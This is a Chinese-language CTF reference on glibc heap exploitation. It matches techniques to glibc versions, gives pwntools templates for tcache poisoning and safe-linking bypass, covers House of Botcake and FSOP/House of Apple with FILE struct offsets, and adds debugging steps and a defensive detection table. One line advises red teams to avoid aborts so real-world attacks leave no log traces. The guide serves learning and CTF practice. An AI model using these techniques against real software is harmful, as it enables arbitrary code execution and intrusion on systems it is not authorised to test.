# 堆利用：glibc 版本差异、原语与 house 选择

> 被 `pwn-chain` 引用。堆题 90% 的失败不是"技术不对"，而是**glibc 版本对不上**
> ——同一个 payload 在 2.27 通、2.31 崩、2.35 直接 abort。
> 先确定版本，再选技术，最后才写 exp。

## 一、第一步：锁定版本与分配器状态

```bash
# 1) 从 libc 文件读版本（最可靠）
strings -a ./libc.so.6 | grep -m3 "GNU C Library"
./libc.so.6                                  # 直接执行会打印版本头
readelf -n ./libc.so.6 | grep -i "version"

# 2) 从 leak 反查（远程只给 leak 时）
# 拿到 puts/read 的真实地址后：
python3 -c "
from pwn import *
d=ELF('./libc.so.6')
print(hex(next(d.search(0x7f0000000000))))"
# 或 https://libc.rip / libc-database
./find printf 0x6f0 1ca0        # libc-database：最后 3 位十六进制

# 3) 运行时确认（本地）
ldd ./vuln | grep libc
python3 -c "import ctypes; print(ctypes.CDLL('libc.so.6').gnu_get_libc_version())"
```

| 版本 | tcache | safe-linking | `__free_hook` | 关键变化 |
| --- | --- | --- | --- | --- |
| 2.23 | 无 | 无 | 有 | 经典 fastbin/unsorted |
| 2.26 | **引入**（64 bin，每 bin 7 个） | 无 | 有 | tcache 让利用变简单 |
| 2.27 | 有 | 无 | 有 | **CTF 最常见**；tcache 无 key 校验 |
| 2.29 | 有 | 无 | 有 | tcache 加 `key` 字段 → 简单 double free 失效 |
| 2.31 | 有 | 无 | 有 | 常见于 Ubuntu 20.04 |
| **2.32** | 有 | **引入** | 有 | tcache/fastbin 指针 XOR 混淆 |
| 2.34 | 有 | 有 | **移除** | hooks 全删 → 必须走 FILE/其它目标 |
| 2.35+ | 有 | 有 | 无 | `_IO_wfile_jumps` / House of Apple 时代 |

> **口误纠正**：safe-linking 是 **2.32** 引入的，不是 2.31。
> 2.31 上写 `p64(heap) ^ (pos>>12)` 会直接崩——因为 2.31 根本不做 XOR。

## 二、分配器核心结构（决定 payload 形状）

```
chunk（64 位，单位字节）:
  +0x00 prev_size    （前一个 chunk 空闲时才有意义）
  +0x08 size         （低 3 位：PREV_INUSE=1, IS_MMAPPED=2, NON_MAIN_ARENA=4）
  +0x10 用户数据起点
  下一个 chunk 的 prev_size 紧邻当前用户区末尾

最小 chunk: 0x20（0x10 头 + 0x10 用户区）
请求 size 与 chunk size 的换算: chunk = ALIGN_UP(req + 8, 0x10)，最小 0x20
```

| 结构 | 链形态 | 取出顺序 | 何时用 | leak 能力 |
| --- | --- | --- | --- | --- |
| **tcache** | 单链（`next` 在用户区） | LIFO | size ≤ 0x410，每 bin ≤ 7 | 无（指针就是堆地址） |
| **fastbin** | 单链（`fd` 在用户区） | LIFO | size ≤ 0x80（global_max_fast） | 无 |
| **unsorted bin** | 双链（`fd`/`bk`） | FIFO（插入头、取出尾） | 任意大（先归这里） | **有：fd/bk 指向 main_arena** |
| **small bin** | 双链 | FIFO | < 0x400 | 有 |
| **large bin** | 双链 + `fd_nextsize`/`bk_nextsize` | 按 size 排序 | ≥ 0x400 | 有 |

**关键数字**（64 位默认）：

| 项 | 值 |
| --- | --- |
| `global_max_fast` | 0x80（fastbin 上限） |
| tcache bins | 64 个，size 0x20 ~ 0x410，步长 0x10 |
| tcache count 上限 | 7（`tcache_count[idx]`） |
| unsorted bin 索引 | `bins[0]` / `bins[1]`（`main_arena.bins[0..1]`） |
| unsorted leak 偏移 | `main_arena + 0x60`（即 `&bins[0]-0x10`），实际值用 `libc.sym['main_arena']+96` 算 |

```python
# main_arena 偏移随版本变化，必须从 libc 符号取
from pwn import *
libc = ELF('./libc.so.6')
main_arena = libc.sym['main_arena']            # 2.27~2.35 都有该符号
unsorted_fd_off = main_arena + 0x60            # bins[0] 的 fd 指向自身-0x10
print("leak -> libc base:", hex(leaked - unsorted_fd_off))
```

## 三、常见原语与它们的版本依赖

| 原语 | 触发条件 | 失败时的表现 |
| --- | --- | --- |
| **UAF** | free 后指针未清 | 无（只要程序不崩） |
| **double free** | 同指针 free 两次 | 2.29+：`free(): double free detected in tcache 2` |
| **off-by-one (null)** | 写 size 字段低字节 | 触发 `corrupted size vs. prev_size` |
| **off-by-null** | 覆盖下一 chunk 的 `prev_size` + `PREV_INUSE=0` | 触发 unlink 检查 |
| **堆溢出** | 写超界 | 视覆盖对象而定 |
| **任意写** | tcache/fastbin poisoning / unsorted attack | `malloc(): unaligned tcache chunk detected` |

### 3.1 tcache poisoning（最常用）

```python
# 目标：让 malloc 返回任意地址
# 步骤：free 两个同 size chunk → 用 UAF 改第一个的 next → 两次 malloc
add(0, 0x60)          # A
add(1, 0x60)          # B
free(0); free(1)      # tcache: B -> A -> NULL
edit(1, p64(target))  # B.next = target（2.32+ 要 XOR）
add(2, 0x60)          # 返回 B
add(3, 0x60)          # 返回 target  ★
```

**2.32+ safe-linking**：

```
真实存储值 = (chunk_addr >> 12) XOR 目标地址
```

所以必须先拿到**堆地址**（通常靠另一个漏洞：UAF 读、show 功能、或者
`/proc/self/maps` 泄露、堆喷后已知偏移）。

```python
def protect(pos, ptr):   # 模拟 glibc PROTECT_PTR
    return (pos >> 12) ^ ptr

def reveal(pos, val):    # 解混淆
    return (pos >> 12) ^ val

# 用法：已知 B 的地址 heap_b，要写 next 指向 target
edit(1, p64(protect(heap_b, target)))
# 若只能读不能算地址：读 B 的 next，得到 enc；enc ^ (heap_b>>12) = 真实 next
```

| 报错 | 含义 | 处置 |
| --- | --- | --- |
| `malloc(): unaligned tcache chunk detected` | 2.32+ 的 `aligned_OK` 检查：目标地址未 16 字节对齐 | target 换成对齐地址（如 `__free_hook-8`） |
| `free(): invalid pointer` | 释放了非法地址（tcache 里取到伪造 chunk 又被 free） | 检查 chunk 头是否伪造了合法 size |
| `malloc(): corrupted top size` | 覆盖了 top chunk 的 size | 别越界写 top |
| `double free or corruption (!prev)` | fastbin/unsorted 的链检查失败 | 检查 fake chunk 的 `size` 与 `prev_inuse` |

### 3.2 fastbin dup（tcache 满时）

```text
1. 先把对应 size 的 tcache bin 填满 7 个（否则 free 进 tcache，不进 fastbin）
2. free A; free B; free A  → fastbin: A -> B -> A（形成环）
3. malloc 两次拿到 B、A；此时 fastbin 头仍是 A
4. 改 A->fd = target（2.32+ 同样 XOR）
5. malloc 三次：A、target
```

**2.29+ 的 fastbin 检查**：`free` 时检查 `chunk->size` 是否落在对应 bin 范围
（`if (__builtin_expect (fastbin_index (chunksize (p)) != idx, 0))` → `free(): invalid size`）。
伪造 chunk 时 size 必须精确。

### 3.3 unsorted bin attack（2.29 后基本失效）

```text
老版本（< 2.29）：unsorted bin 取出时 bk->fd = unsorted_chunks，可写一个 libc 地址到任意位置
2.29+ 加了检查：if (bck->fd != victim) → "malloc(): unsorted double linked list corrupted"
→ 现代替代：large bin attack（同样写一个堆/libc 地址，2.30+ 也收紧）
```

### 3.4 大 chunk 与 mmap 阈值

```
请求 >= 0x20000（128KB，mp_.mmap_threshold 默认）→ mmap 分配，独立映射，free 后 munmap
→ 这类 chunk 不能与主堆合并，利用价值低（ctf 里通常避免）
动态调整：free 一个 mmap chunk 后阈值会上调，可用来"训练"分配器
```

## 四、House 系列：按版本与前提选

| House | 前提 | 有效版本 | 目标 | 现状 |
| --- | --- | --- | --- | --- |
| **House of Spirit** | 能 free 一个指向可控内存的指针（栈/堆） | 全版本 | 让 malloc 返回可控地址 | 需伪造 size 通过检查，仍有效 |
| **House of Force** | 能覆盖 top chunk size 为 -1 | **< 2.29** | 任意地址分配 | 2.29 加了 top size 检查，失效 |
| **House of Einherjar** | off-by-one null + 可控 `prev_size` | 全版本 | 向前合并到伪造 chunk | 需绕过 unlink 检查，仍有效 |
| **House of Lore** | 控制 smallbin 的 `bk` | 全版本（有检查） | 分配任意地址 | 检查 `bck->fd == victim`，现代难 |
| **House of Orange** | 有堆溢出 + 无 free 功能 | ≤ 2.23 最好；2.24+ 受 vtable 检查限制 | 走 `_IO_list_all` 拿 shell | 需 FSOP 配合，2.29+ 很难 |
| **House of Botcake** | double free + tcache 满 | 2.29 ~ 2.35 | 绕过 tcache double-free 检测 | **2.31 上最实用** |
| **House of Corrosion** | 可控 largebin + 多次分配 | 2.27 ~ 2.31 | 写 `global_max_fast` / `_IO_list_all` | 复杂，特定题目 |
| **House of Kiwi** | 能写 `_IO_file_jumps` / 触发 `__malloc_assert` | 2.32+ | 走 `_IO_file_jumps` → 调 `setcontext` | 需要 stderr FILE |
| **House of Apple 2** | 可控 `_IO_wfile_jumps` + 大块 | 2.35+ | FSOP 拿 shell | **2.35+ 主流** |
| **House of Emma** | 可控 `_IO_wfile_jumps` + 小堆块 | 2.35+ | FSOP 变体 | 与 Apple 互补 |

### 4.1 House of Botcake（2.31 实用例）

```text
前提：能 double free，且能控制 tcache 填充
1. 分配 7 个同 size chunk 填满 tcache（size S）
2. 再分配 A、B（同 size S，物理相邻，B 在 A 之后）
3. free(A); free(B)          → 两个进 unsorted（tcache 已满）
4. free(A) 再次               → A 进 tcache（此时 A 同时在 unsorted 与 tcache）
5. 分配一个 S，从 tcache 取出 A  → tcache count 减 1
6. 此时 unsorted 的 A 与 tcache 的 B 重叠 → 再 malloc 可拿到 B 附近的地址
→ 结果：可以让两个不同请求返回同一块内存（UAF 效果）
```

**它的价值**：绕过 2.29+ 的 tcache `key` 检测（因为不是直接 double free 同一个 tcache 项）。

### 4.2 FSOP（2.34+ 唯一现实路径）

`__free_hook`/`__malloc_hook` 在 2.34 被删除，主流转向 FILE 结构：

```
_IO_FILE_plus 布局（关键偏移，64 位）:
  +0x00 _flags
  +0x08 _IO_read_ptr
  +0x10 _IO_read_end
  +0x18 _IO_read_base
  +0x20 _IO_write_base
  +0x28 _IO_write_ptr
  +0x30 _IO_write_end
  +0x38 _IO_buf_base
  +0x40 _IO_buf_end
  +0x48 _IO_save_base
  +0x50 _IO_backup_base
  +0x58 _IO_save_end
  +0x60 _markers
  +0x68 _chain          ← 串起所有 FILE（FSOP 挂链点）
  +0x70 _fileno
  +0x74 _flags2
  +0x78 _old_offset
  +0x88 _lock
  +0x90 _offset
  +0x98 _codecvt
  +0xa0 _wide_data      ← House of Apple/Kiwi 的关键指针
  +0xa8 _freeres_list
  +0xb0 _freeres_buf
  +0xb8 __pad5
  +0xc0 _mode
  +0xc4 _unused2
  +0xd8 vtable          ← _IO_FILE_plus 的 vtable 指针
```

```text
House of Apple 2 的核心：把 vtable 指向 _IO_wfile_jumps，
再让 _wide_data 指向可控内存，触发 _IO_wfile_overflow 里的
  _IO_wdoallocbuf → _IO_WDOALLOCATE(fp)
从而调用我们布置的 _wide_vtable->__doallocate
→ 等价于"受控函数指针调用"
```

**必须知道的检查**（否则写了也不触发）：

| 检查 | 位置 | 绕过 |
| --- | --- | --- |
| vtable 必须在 `__libc_IO_vtables` 段内 | `_IO_vtable_check`（2.24+） | 只能用合法 vtable，走 `_wide_data` 二次跳转（Apple/Kiwi） |
| `_IO_wfile_jumps` 地址 | `libc.sym['_IO_wfile_jumps']` | 版本相关，必须从 libc 取 |
| `_IO_list_all` | `libc.sym['_IO_list_all']` | 挂链，触发 flush |

## 五、堆风水（Heap Feng Shui）

| 目标 | 手法 |
| --- | --- |
| 让某对象相邻可控 chunk | 先大量分配同 size 填坑，再 free 出空洞 |
| 稳定拿到连续块 | 用 tcache 的 LIFO 顺序反推："先 free 的后拿到" |
| 清空 tcache | malloc 7 次把 bin 抽干（或 free 大块触发 consolidation） |
| 触发合并（consolidate） | free 一个 > 0x410 的 chunk，或调用 `malloc_trim` |
| 隔离堆（thread arena） | 起新线程（`pthread_create`）→ 新 arena，地址不连续 |
| 精确控制地址 | 用 `setbuf(stdin, NULL)` 之类的库调用先占位 |

```python
# 标准"造相邻"模板
for i in range(10):
    add(i, 0x60)         # 连续 10 块
for i in range(0, 10, 2):
    free(i)              # 偶数块进 tcache，奇数块仍在
# 此时 free(1) 会与 0/2 的空洞合并？—— 只有当它们不在 tcache 时才会
```

**关键认知**：tcache 里的 chunk **不参与合并**（`PREV_INUSE` 保持 1，且不从 unsorted 走）。
想让两块合并，必须让 tcache 满（7 个）或超过 tcache 范围（> 0x410）。

## 六、调试：pwndbg 的堆视图

```bash
gdb -q ./vuln -ex "set pagination off" -ex "b *main+0x120" -ex "run"
# 进入后
pwndbg> heap            # 全部 chunk（含 free/inuse/tcache）
pwndbg> bins            # fastbin/small/unsorted/large/tcache 一览
pwndbg> vis_heap_chunks # 可视化，看 prev_size/size/fd/bk
pwndbg> tcachebins      # 2.26+ tcache 每 bin 的内容与 count
pwndbg> parseheap       # 结构化列表
pwndbg> x/8gx 0x555555559000
```

| 命令 | 用途 |
| --- | --- |
| `bins` | 一眼看出哪条链有几个、fd 指向哪 |
| `vis_heap_chunks 20` | 看 20 个 chunk 的原始布局 |
| `tcachebins` | 看 count 是否已满 7 |
| `heap -v` | 带地址与状态 |
| `p main_arena` | 直接看 bins 数组（需符号） |
| `p &main_arena.bins[0]` | unsorted bin 头，与 leak 对账 |

## 七、检测视角（防守方）

| 手法 | 可观测信号 |
| --- | --- |
| 堆溢出 | glibc 的 `malloc_printerr` 输出到 stderr（`corrupted size vs. prev_size`） |
| 异常分配 | `malloc` 返回非堆段地址（ld.so 的 `unaligned tcache chunk`） |
| hooks 被改 | 2.31 及以前：`__free_hook` 指向非 libc 段（可用内存扫描发现） |
| FSOP | `_IO_list_all` 链上出现非 libc 段 FILE；vtable 指向非 `__libc_IO_vtables` |
| 大量 mmap | `/proc/<pid>/maps` 出现大量匿名可写映射 |

对红队：**这些 abort 消息会写进目标进程 stderr / 容器日志**，
在真实环境里等于"自报家门"。实战 exploit 要保证**零 abort**（不依赖会崩的路径）。

## 八、验伤信号

| 声称 | 证据 |
| --- | --- |
| "拿到任意写" | 写一个**已知只读/特征地址**（如 `__free_hook`）后读回，值确实变了 |
| "leak 成功" | leak 值与 `libc base + 符号偏移` 的差值是 **0x10 对齐**且落在 libc 映射内 |
| "tcache poisoning 成功" | `malloc` 返回的地址 == 目标地址（打印指针），且**未 abort** |
| "拿到 shell" | `id` 输出是目标 uid，且**连续 20 次**可复现 |

**反例（看起来成功其实是假）**：

- `p64(target)` 写进去没崩，但 malloc 从没返回 target → 写的是**错的 bin**（size 不匹配）
- leak 出来的值像 libc 地址，但 base 算出来不是页对齐 → 泄漏的是**堆上的残留指针**，不是 unsorted fd
- 本地 100% 通、远程 0% → libc 版本不同（最常见）/ tcache 初始状态不同（远程有预热分配）
- 远程"通了"但只拿到 `uid=1000` 而非 root → 打的是本进程提权，不是 setuid 目标
- 2.32+ 上直接 `p64(target)` 不崩 → 说明目标程序走的是 **2.31 的 libc**，你没在测你以为的版本

## 九、常见坑

1. **不确认 glibc 版本就写 payload**——2.27 的 payload 在 2.31 上 100% abort。
   版本要从 libc 文件/leak 双确认，不能靠"题目说 Ubuntu 20.04"。
2. **safe-linking 记成 2.31**——是 2.32。在 2.31 上做 XOR 会让指针变成垃圾。
3. **tcache 没满就指望 fastbin**——free 先进 tcache，fastbin 里啥都没有，
   于是"fastbin dup"从头到尾没生效。
4. **忘了 `setbuf` 造成的初始分配**——`stdin/stdout` 缓冲会先占几个 chunk，
   偏移算错一位，全盘皆错。本地先用 `bins` 看清初始状态。
5. **远程 tcache 状态不同**——远程服务可能先处理过请求（预热），
   tcache 里已有残留。exp 要**自己清空/填满**再开始，不能假设空。
6. **依赖会 abort 的路径**——`unsorted bin attack` 在 2.29+ 直接 abort，
   日志里留下痕迹。用前先确认版本。
7. **`__free_hook` 在 2.34 不存在**——`libc.sym['__free_hook']` 返回 0 或抛异常，
   别把它当"偏移算错"。